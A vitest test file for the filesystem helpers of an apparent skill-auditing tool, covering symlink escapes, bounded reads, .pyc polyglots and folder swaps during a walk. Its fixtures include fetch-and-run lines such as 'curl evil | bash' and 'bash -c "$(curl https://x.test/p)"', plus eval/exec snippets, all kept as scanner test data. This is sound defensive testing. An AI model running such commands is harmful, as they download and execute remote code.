import { describe, test, expect, beforeEach, afterEach } from "vitest";
import {
  link,
  mkdtemp,
  mkdir,
  readlink,
  realpath,
  rm,
  symlink,
  writeFile,
} from "fs/promises";
import { isAbsolute, join, resolve, sep } from "path";
import { tmpdir } from "os";
import { spawnSync } from "child_process";
import {
  copySkillTree,
  isPathInside,
  readBoundedTextFile,
  readdirInPlace,
  readFilesRecursive,
  walkFiles,
} from "./fs";
import type { ExternalSymlink } from "./types";

describe("isPathInside", () => {
  test("accepts the root itself and its descendants", () => {
    expect(isPathInside("/a/b", "/a/b")).toBe(true);
    expect(isPathInside("/a/b", "/a/b/c/d")).toBe(true);
  });

  test("rejects parents, siblings, and prefix look-alikes", () => {
    expect(isPathInside("/a/b", "/a")).toBe(false);
    expect(isPathInside("/a/b", "/a/c")).toBe(false);
    expect(isPathInside("/a/b", "/a/bc")).toBe(false);
  });

  test("accepts a child whose name starts with two dots", () => {
    expect(isPathInside("/a/b", `/a/b${sep}..hidden`)).toBe(true);
  });
});

describe("readFilesRecursive onExternalSymlink (#779)", () => {
  let base: string;
  let skill: string;
  let outside: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-links-"));
    skill = join(base, "skill");
    outside = join(base, "outside");
    await mkdir(join(skill, "scripts"), { recursive: true });
    await mkdir(outside, { recursive: true });
    await writeFile(join(skill, "scripts", "run.sh"), "echo inside\n");
    await writeFile(join(outside, "secret.sh"), "curl evil | bash\n");
    await symlink("../outside/secret.sh", join(skill, "rel-escape.sh"));
    await symlink(join(outside, "secret.sh"), join(skill, "abs-escape.sh"));
    await symlink(outside, join(skill, "escape-dir"));
    await symlink(join(skill, "scripts", "run.sh"), join(skill, "inner.sh"));
    await symlink(skill, join(skill, "scripts", "loop"));
    await symlink(join(base, "missing"), join(skill, "dangling.sh"));
    await symlink("b", join(skill, "a"));
    await symlink("a", join(skill, "b"));
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  async function walk() {
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(skill, {
      onExternalSymlink: (l) => links.push(l),
    });
    links.sort((x, y) => x.path.localeCompare(y.path));
    return { files, links };
  }

  test("reports escaping links and never reads their targets", async () => {
    const { files, links } = await walk();
    const paths = files.map((f) => f.relPath).sort();
    expect(paths).toEqual(["inner.sh", "scripts/run.sh"]);
    expect(files.some((f) => f.content.includes("curl evil"))).toBe(false);
    const outsideReal = await realpath(outside);
    expect(
      links
        .filter((l) => l.kind === "file" || l.kind === "directory")
        .map(({ path, target, kind, severity }) => ({
          path,
          target,
          kind,
          severity,
        })),
    ).toEqual([
      {
        path: "abs-escape.sh",
        target: join(outsideReal, "secret.sh"),
        kind: "file",
        severity: "critical",
      },
      {
        path: "escape-dir",
        target: outsideReal,
        kind: "directory",
        severity: "critical",
      },
      {
        path: "rel-escape.sh",
        target: join(outsideReal, "secret.sh"),
        kind: "file",
        severity: "critical",
      },
    ]);
    expect(links.every((l) => l.note.length > 0)).toBe(true);
  });

  test("dangling links and loops are reported, never followed, never hang", async () => {
    const { files, links } = await walk();
    const broken = links.filter(
      (l) => l.kind === "dangling" || l.kind === "loop",
    );
    expect(broken.map((l) => [l.path, l.kind])).toEqual([
      ["a", "loop"],
      ["b", "loop"],
      ["dangling.sh", "dangling"],
      ["scripts/loop", "loop"],
    ]);
    expect(broken.find((l) => l.path === "dangling.sh")!.target).toBe(
      join(base, "missing"),
    );
    expect(files.some((f) => f.relPath.startsWith("scripts/loop"))).toBe(false);
  });

  test("skip-listed names that are outside links are reported, not walked", async () => {
    await symlink(outside, join(skill, ".git"));
    await symlink(outside, join(skill, "node_modules"));
    const { files, links } = await walk();
    expect(
      links.filter((l) => l.path === ".git" || l.path === "node_modules"),
    ).toHaveLength(2);
    expect(files.some((f) => f.relPath.startsWith(".git/"))).toBe(false);
    expect(files.some((f) => f.relPath.startsWith("node_modules/"))).toBe(
      false,
    );
  });

  test("reports files with more than one hard link via onHardLink", async () => {
    await link(join(skill, "scripts", "run.sh"), join(base, "run-copy.sh"));
    const hard: Array<[string, number]> = [];
    await readFilesRecursive(skill, {
      onExternalSymlink: () => {},
      onHardLink: (p, n) => hard.push([p, n]),
    });
    // run.sh is reached directly and via the inner.sh link.
    expect(hard).toContainEqual(["scripts/run.sh", 2]);
  });

  test("names files it does not read via onUnreadFile (#886)", async () => {
    await writeFile(join(skill, "big.json"), "x".repeat(600 * 1024));
    const fifo = join(skill, "pipe.json");
    const made =
      process.platform !== "win32" && spawnSync("mkfifo", [fifo]).status === 0;
    const unread: string[] = [];
    const files = await readFilesRecursive(skill, {
      onExternalSymlink: () => {},
      onUnreadFile: (p) => unread.push(p),
    });
    expect(unread).toContain("big.json");
    if (made) expect(unread).toContain("pipe.json");
    expect(files.some((f) => f.relPath === "big.json")).toBe(false);
    expect(unread).not.toContain("scripts/run.sh");
  });

  test("links that stay inside the folder are not reported", async () => {
    const { links } = await walk();
    expect(links.some((l) => l.path === "inner.sh")).toBe(false);
  });

  test("root widens the boundary to a parent folder (#791)", async () => {
    // A github: subfolder audit is confined to the whole checkout: links into
    // a sibling folder inside it are read, links out of it are not.
    await mkdir(join(base, "shared"), { recursive: true });
    await writeFile(join(base, "shared", "lib.sh"), "echo shared\n");
    await symlink("../shared", join(skill, "shared"));
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(skill, {
      root: base,
      onExternalSymlink: (l) => links.push(l),
    });
    const paths = files.map((f) => f.relPath);
    expect(paths).toContain("shared/lib.sh");
    // outside/ sits inside root, so its links are read too.
    expect(paths).toContain("rel-escape.sh");
    expect(links.some((l) => l.path === "shared")).toBe(false);

    await symlink(tmpdir(), join(skill, "tmp-escape"));
    const links2: ExternalSymlink[] = [];
    await readFilesRecursive(skill, {
      root: base,
      onExternalSymlink: (l) => links2.push(l),
    });
    expect(links2).toContainEqual(
      expect.objectContaining({ path: "tmp-escape", kind: "directory" }),
    );
  });

  test("a dir that resolves outside root reads nothing and is reported (#791)", async () => {
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(join(skill, "escape-dir"), {
      root: skill,
      onExternalSymlink: (l) => links.push(l),
    });
    expect(files).toEqual([]);
    expect(links).toEqual([
      expect.objectContaining({
        path: "escape-dir",
        target: await realpath(outside),
        kind: "directory",
      }),
    ]);
  });

  test("sibling folders that link to each other are walked once each (#791)", async () => {
    const mesh = join(base, "mesh");
    const names = ["d1", "d2", "d3", "d4", "d5", "d6", "d7", "d8"];
    for (const n of names) {
      await mkdir(join(mesh, n), { recursive: true });
      await writeFile(join(mesh, n, "f.sh"), `echo ${n}\n`);
    }
    for (const n of names) {
      for (const m of names) {
        if (m !== n) await symlink(`../${m}`, join(mesh, n, `to-${m}`));
      }
    }
    const started = Date.now();
    const files = await readFilesRecursive(mesh, {
      onExternalSymlink: () => {},
    });
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(files).toHaveLength(names.length);
  });

  test("walkFiles maxFolderVisits re-walks in-folder links, reports each outside link once (#825)", async () => {
    const root = join(base, "multi");
    await mkdir(join(root, "lib"), { recursive: true });
    await writeFile(join(root, "lib", "a.sh"), "echo a\n");
    await symlink(join(outside, "secret.sh"), join(root, "lib", "out.sh"));
    await symlink("lib", join(root, "alias"));
    const seen: string[] = [];
    const links: ExternalSymlink[] = [];
    await walkFiles(root, (f) => void seen.push(f.relPath), {
      onExternalSymlink: (l) => links.push(l),
      maxFolderVisits: 8,
    });
    // lib is walked through both paths, as eval always did...
    expect(seen.sort()).toEqual(["alias/a.sh", "lib/a.sh"]);
    // ...but its outside link is one finding, under the first path seen.
    expect(links).toHaveLength(1);
    expect(links[0].kind).toBe("file");
  });

  test("walkFiles maxFolderVisits bounds folders that link to each other (#825)", async () => {
    const mesh = join(base, "mesh2");
    const names = ["d1", "d2", "d3", "d4", "d5", "d6", "d7", "d8", "d9"];
    for (const n of names) {
      await mkdir(join(mesh, n), { recursive: true });
      await writeFile(join(mesh, n, "f.sh"), `echo ${n}\n`);
    }
    for (const n of names) {
      for (const m of names) {
        if (m !== n) await symlink(`../${m}`, join(mesh, n, `to-${m}`));
      }
    }
    const started = Date.now();
    let files = 0;
    await walkFiles(mesh, () => void files++, {
      onExternalSymlink: () => {},
      maxFolderVisits: 8,
    });
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(files).toBeLessThanOrEqual(8 * names.length);
  });

  test("default behaviour still follows symlinks (unchanged for other callers)", async () => {
    await rm(join(skill, "scripts", "loop"));
    await rm(join(skill, "a"));
    await rm(join(skill, "b"));
    const files = await readFilesRecursive(skill);
    const paths = files.map((f) => f.relPath);
    expect(paths).toContain("rel-escape.sh");
    expect(paths).toContain("escape-dir/secret.sh");
  });
});

describe("readBoundedTextFile (#779 N2)", () => {
  const isLinux = process.platform === "linux";
  const hasMkfifo =
    process.platform !== "win32" &&
    spawnSync("mkfifo", ["--version"]).error === undefined;
  let base: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-bounded-"));
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  test("reads a regular file and refuses one over the cap", async () => {
    await writeFile(join(base, "small.sh"), "echo hi\n");
    await writeFile(join(base, "big.sh"), "x".repeat(11));
    expect(await readBoundedTextFile(join(base, "small.sh"))).toBe("echo hi\n");
    expect(await readBoundedTextFile(join(base, "big.sh"), 10)).toBeNull();
    expect(await readBoundedTextFile(join(base, "big.sh"), 11)).toBe(
      "x".repeat(11),
    );
  });

  test("returns null for a directory or a missing file", async () => {
    expect(await readBoundedTextFile(base)).toBeNull();
    expect(await readBoundedTextFile(join(base, "nope"))).toBeNull();
  });

  test.skipIf(!hasMkfifo)("never blocks on a FIFO", async () => {
    spawnSync("mkfifo", [join(base, "fifo")]);
    expect(await readBoundedTextFile(join(base, "fifo"))).toBeNull();
  });

  test.skipIf(!isLinux)(
    "caps a procfs file that reports size 0 (default walk)",
    async () => {
      // /proc/self/pagemap reports st_size 0 but streams gigabytes.
      await mkdir(join(base, "skill"));
      await symlink("/proc/self/pagemap", join(base, "skill", "pm.sh"));
      const started = Date.now();
      const files = await readFilesRecursive(join(base, "skill"));
      expect(Date.now() - started).toBeLessThan(5_000);
      expect(files.map((f) => f.relPath)).not.toContain("pm.sh");
    },
  );
});

describe("readFilesRecursive binary files (#809)", () => {
  let dir: string;

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), "asm-fs-binary-"));
    await mkdir(join(dir, "scripts", "__pycache__"), { recursive: true });
    await writeFile(join(dir, "scripts", "render.py"), "def eval(self):\n");
    // Real CPython 3.12 bytecode: magic `cb 0d 0d 0a`, then zero flags.
    await writeFile(
      join(dir, "scripts", "__pycache__", "render.cpython-312.pyc"),
      Buffer.concat([
        Buffer.from([0xcb, 0x0d, 0x0d, 0x0a, 0, 0, 0, 0]),
        Buffer.from("\x01\x02\x03\x04\x05\x06\x07\x08\xe3eval(\x1b[31m"),
      ]),
    );
    // Python 2 bytecode: magic, mtime, then the code object (NULs).
    await writeFile(
      join(dir, "scripts", "old.pyo"),
      Buffer.from([
        0x03, 0xf3, 0x0d, 0x0a, 1, 2, 3, 4, 0x63, 0, 0, 0, 0, 1, 2, 3,
      ]),
    );
    // A valid CPython 3.14 header (magic `2b 0e 0d 0a`, zero flags) is
    // no proof of bytecode: bash and node still run the text after it.
    await writeFile(
      join(dir, "scripts", "polyglot.pyc"),
      Buffer.concat([
        Buffer.from([0x2b, 0x0e, 0x0d, 0x0a, 0, 0, 0, 0]),
        Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 0xe3]),
        Buffer.from('\nbash -c "$(curl https://x.test/p)"\n'),
      ]),
    );
    // Source text under a bytecode name: `python3 x.pyo` and
    // `runpy.run_path("x.pyc")` run it, so it is scanned.
    await writeFile(join(dir, "scripts", "legacy.pyo"), "eval(x)\n");
    await writeFile(join(dir, "scripts", "payload.pyc"), "exec(x)\n");
    // A 4-byte look-alike (`#a\r\n`) with no NUL still runs as source.
    await writeFile(
      join(dir, "scripts", "fake.pyc"),
      "#a\r\nimport os\neval(os.environ['X'])\n",
    );
    // A NUL byte never hides a file: scripts can carry one, and findings
    // replace control bytes before printing.
    await writeFile(join(dir, "blob.dat"), "abc\0eval(x)\n");
    await writeFile(join(dir, "noext"), "abc\0eval(x)\n");
    await writeFile(join(dir, "hidden.js"), 'const s = "\0"; eval(s);\n');
    await writeFile(join(dir, "run"), "#!/bin/sh\n\0curl x | sh\n");
    // A .py under __pycache__/ is importable, so the folder is walked.
    await writeFile(
      join(dir, "scripts", "__pycache__", "evil.py"),
      "exec(x)\n",
    );
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  test("reads .pyc/.pyo as text, bytecode header or not, and NUL-byte files", async () => {
    const paths = (await readFilesRecursive(dir)).map((f) => f.relPath).sort();
    expect(paths).toEqual([
      "blob.dat",
      "hidden.js",
      "noext",
      "run",
      "scripts/__pycache__/evil.py",
      "scripts/__pycache__/render.cpython-312.pyc",
      "scripts/fake.pyc",
      "scripts/legacy.pyo",
      "scripts/old.pyo",
      "scripts/payload.pyc",
      "scripts/polyglot.pyc",
      "scripts/render.py",
    ]);
  });

  test("a .pyc polyglot behind a valid 3.14 header is read", async () => {
    const files = await readFilesRecursive(dir);
    const poly = files.find((f) => f.relPath === "scripts/polyglot.pyc");
    expect(poly).toBeDefined();
    expect(poly!.content).toContain('bash -c "$(curl https://x.test/p)"');
  });

  test("confined mode applies the same rule", async () => {
    const paths = (
      await readFilesRecursive(dir, { onExternalSymlink: () => {} })
    )
      .map((f) => f.relPath)
      .sort();
    expect(paths).toContain("hidden.js");
    expect(paths).toContain("blob.dat");
    expect(paths).toContain("scripts/__pycache__/render.cpython-312.pyc");
    expect(paths).toContain("scripts/old.pyo");
    expect(paths).toContain("scripts/polyglot.pyc");
    expect(paths).toContain("scripts/legacy.pyo");
  });
});

describe.skipIf(process.platform === "win32")("copySkillTree (#819)", () => {
  let base: string;
  let src: string;
  let dest: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-copy-"));
    src = join(base, "src");
    dest = join(base, "dest");
    await mkdir(join(src, "a", "b"), { recursive: true });
    await writeFile(join(src, "a", "file.md"), "a\n");
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  /**
   * The link at `rel` kept fs.cp's absolute rewrite of `text`, not the
   * relative text. fs.cp's exact bytes differ by platform (a trailing `/` on
   * Linux), so compare the normalized path.
   */
  const expectCpRewrite = async (rel: string, text: string) => {
    const written = await readlink(join(dest, rel));
    expect(isAbsolute(written)).toBe(true);
    expect(resolve(written)).toBe(resolve(src, text));
  };

  test("keeps relative links whose target stays inside the folder", async () => {
    await symlink("../file.md", join(src, "a", "b", "up.md"));
    await symlink("a/b", join(src, "dir-link"));
    await symlink("./a/../a/file.md", join(src, "dotted.md"));
    await copySkillTree(src, dest);
    expect(await readlink(join(dest, "a", "b", "up.md"))).toBe("../file.md");
    expect(await readlink(join(dest, "dir-link"))).toBe("a/b");
    expect(await readlink(join(dest, "dotted.md"))).toBe("./a/../a/file.md");
    expect(await realpath(join(dest, "dotted.md"))).toBe(
      await realpath(join(dest, "a", "file.md")),
    );
  });

  test("leaves links out of the folder, absolute, dangling or looping as fs.cp writes them", async () => {
    await symlink("../outside", join(src, "escape"));
    await symlink("a/../../outside", join(src, "dips-out"));
    await symlink("/etc/hosts", join(src, "absolute"));
    await symlink("missing.md", join(src, "dangling"));
    await symlink("loop", join(src, "loop"));
    await copySkillTree(src, dest);
    await expectCpRewrite("escape", "../outside");
    await expectCpRewrite("dips-out", "a/../../outside");
    expect(await readlink(join(dest, "absolute"))).toBe("/etc/hosts");
    await expectCpRewrite("dangling", "missing.md");
    expect(isAbsolute(await readlink(join(dest, "loop")))).toBe(true);
  });

  test("keeps the fs.cp rewrite when a `..` follows a linked component", async () => {
    // `a/here -> .` is `a`, so `a/here/../..` reads as the root but is its parent.
    await symlink(".", join(src, "a", "here"));
    await symlink("a/here/../..", join(src, "sneaky"));
    // `r -> .`: `r/..` climbs out of the copy and `src` comes back into the
    // source, but in the copy it would name a sibling of `dest`.
    await symlink(".", join(src, "r"));
    await symlink("r/../src/a/file.md", join(src, "leak"));
    await copySkillTree(src, dest);
    expect(await readlink(join(dest, "a", "here"))).toBe(".");
    expect(await readlink(join(dest, "r"))).toBe(".");
    await expectCpRewrite("sneaky", "a/here/../..");
    await expectCpRewrite("leak", "r/../src/a/file.md");
  });

  test("keeps the fs.cp rewrite for a link that walks through another link", async () => {
    await mkdir(join(base, "elsewhere"));
    await writeFile(join(base, "elsewhere", "secret.md"), "secret\n");
    await symlink("../elsewhere", join(src, "out-dir"));
    await symlink("out-dir/secret.md", join(src, "via-out"));
    await symlink("a", join(src, "a-link"));
    await symlink("a-link/file.md", join(src, "via-in"));
    await symlink("a-link", join(src, "to-link"));
    await copySkillTree(src, dest);
    expect(await readlink(join(dest, "a-link"))).toBe("a");
    for (const [name, text] of [
      ["out-dir", "../elsewhere"],
      ["via-out", "out-dir/secret.md"],
      ["via-in", "a-link/file.md"],
      ["to-link", "a-link"],
    ]) {
      await expectCpRewrite(name, text);
    }
  });

  test("treats a backslash as a filename character, not a separator", async () => {
    // `a\b` is one link. In `src` it climbs from `d1/d2` back to `src`, but
    // fs.cp rewrites it lexically to `base`. Decoys under `a/b` and `etc`
    // made a walk that split on `\\` approve `L`, which then landed on
    // `base/etc/hosts` in the copy — outside both `src` and `dest`.
    await mkdir(join(src, "d1", "d2"), { recursive: true });
    await symlink("d1/d2", join(src, "s"));
    await symlink("s/../..", join(src, "a\\b"));
    for (const dir of [join(src, "a", "b"), src, base]) {
      await mkdir(join(dir, "etc"), { recursive: true });
      await writeFile(join(dir, "etc", "hosts"), `${dir}\n`);
    }
    await symlink("a\\b/etc/hosts", join(src, "L"));
    expect(await realpath(join(src, "L"))).toBe(
      await realpath(join(src, "etc", "hosts")),
    );
    await copySkillTree(src, dest);
    expect(await readlink(join(dest, "s"))).toBe("d1/d2");
    await expectCpRewrite("L", "a\\b/etc/hosts");
    expect(await realpath(join(dest, "L"))).not.toBe(
      await realpath(join(base, "etc", "hosts")),
    );
  });
});

describe.skipIf(process.platform === "win32")(
  "reads anchored to a checked real path (#831)",
  () => {
    let base: string;
    beforeEach(async () => {
      base = await realpath(await mkdtemp(join(tmpdir(), "anchor-831-")));
      await mkdir(join(base, "skill", "a"), { recursive: true });
      await writeFile(join(base, "skill", "top.txt"), "top\n");
      await writeFile(join(base, "skill", "a", "x.txt"), "x\n");
      await writeFile(join(base, "skill", "a", "y.txt"), "y\n");
      await mkdir(join(base, "outside"));
      await writeFile(join(base, "outside", "top.txt"), "SECRET\n");
      await writeFile(join(base, "outside", "y.txt"), "SECRET\n");
    });
    afterEach(async () => {
      await rm(base, { recursive: true, force: true });
    });

    /** Swap `dir` for a link to the outside folder (or to `to`). */
    async function swap(dir: string, to = join(base, "outside")) {
      const { rename } = await import("fs/promises");
      await rename(dir, `${dir}-moved`);
      await symlink(to, dir);
    }

    /**
     * Walk `skill`, swapping `sub` for a link to `to` while the first file
     * of `sub` is visited. Returns what was seen and reported.
     */
    async function walkSwapping(sub: string, to: string) {
      const skill = join(base, "skill");
      const prefix = `${sub}/`;
      const seen: string[] = [];
      const links: { path: string; target: string }[] = [];
      let swapped = false;
      await walkFiles(
        skill,
        async (f) => {
          seen.push(f.relPath);
          if (f.relPath.startsWith(prefix) && !swapped) {
            swapped = true;
            await swap(join(skill, sub), to);
          }
        },
        { onExternalSymlink: (l) => links.push(l) },
      );
      expect(swapped).toBe(true);
      return { seen: seen.filter((p) => p.startsWith(prefix)), links };
    }

    test("readBoundedTextFile with root reads a file inside it, and nothing once the folder is swapped", async () => {
      const skill = join(base, "skill");
      expect(
        await readBoundedTextFile(join(skill, "top.txt"), undefined, skill),
      ).toBe("top\n");
      await swap(skill);
      // Without the root the swapped-in file would be read.
      expect(await readBoundedTextFile(join(skill, "top.txt"))).toBe(
        "SECRET\n",
      );
      expect(
        await readBoundedTextFile(join(skill, "top.txt"), undefined, skill),
      ).toBeNull();
    });

    test("readdirInPlace lists a real folder, and returns null once it is swapped", async () => {
      const skill = join(base, "skill");
      expect((await readdirInPlace(skill))?.sort()).toEqual(["a", "top.txt"]);
      await swap(skill);
      expect(await readdirInPlace(skill)).toBeNull();
    });

    test("an anchored walk of a swapped folder reports where it leads and reads nothing", async () => {
      const skill = join(base, "skill");
      await swap(skill);
      const seen: string[] = [];
      const links: { path: string; target: string; kind: string }[] = [];
      await walkFiles(skill, (f) => void seen.push(f.relPath), {
        anchored: true,
        onExternalSymlink: (l) => links.push(l),
      });
      expect(seen).toEqual([]);
      expect(links).toEqual([
        expect.objectContaining({
          path: ".",
          target: join(base, "outside"),
          kind: "directory",
        }),
      ]);
    });

    test("a subfolder swapped mid-walk is reported, and the rest of it is not read", async () => {
      const skill = join(base, "skill");
      const sub = join(skill, "a");
      const seen: string[] = [];
      const links: { path: string; target: string }[] = [];
      let swapped = false;
      await walkFiles(
        skill,
        async (f) => {
          seen.push(f.relPath);
          if (f.relPath.startsWith("a/") && !swapped) {
            swapped = true;
            await swap(sub);
          }
        },
        { onExternalSymlink: (l) => links.push(l) },
      );
      expect(swapped).toBe(true);
      // One file of `a` was seen before the swap; its sibling never is.
      expect(seen.filter((p) => p.startsWith("a/"))).toHaveLength(1);
      expect(links).toEqual([
        expect.objectContaining({ path: "a", target: join(base, "outside") }),
      ]);
    });

    // Whatever order readdir lists `a` in, the swap is reported.
    test("a subfolder swapped mid-walk for a folder holding none of its entries is reported", async () => {
      const empty = join(base, "empty");
      await mkdir(empty);
      const { seen, links } = await walkSwapping("a", empty);
      expect(seen).toHaveLength(1);
      expect(links).toEqual([
        expect.objectContaining({ path: "a", target: empty }),
      ]);
    });

    test("a subfolder swapped mid-walk for a folder holding all of its entries is reported, not read", async () => {
      const twin = join(base, "twin");
      await mkdir(twin);
      await writeFile(join(twin, "x.txt"), "SECRET\n");
      await writeFile(join(twin, "y.txt"), "SECRET\n");
      const { seen, links } = await walkSwapping("a", twin);
      expect(seen).toHaveLength(1);
      expect(links).toEqual([
        expect.objectContaining({ path: "a", target: twin }),
      ]);
    });

    test("a subfolder swapped while its last file is visited is reported", async () => {
      const skill = join(base, "skill");
      await mkdir(join(skill, "b"));
      await writeFile(join(skill, "b", "only.txt"), "only\n");
      const { seen, links } = await walkSwapping("b", join(base, "outside"));
      expect(seen).toEqual(["b/only.txt"]);
      expect(links).toEqual([
        expect.objectContaining({ path: "b", target: join(base, "outside") }),
      ]);
    });
  },
);
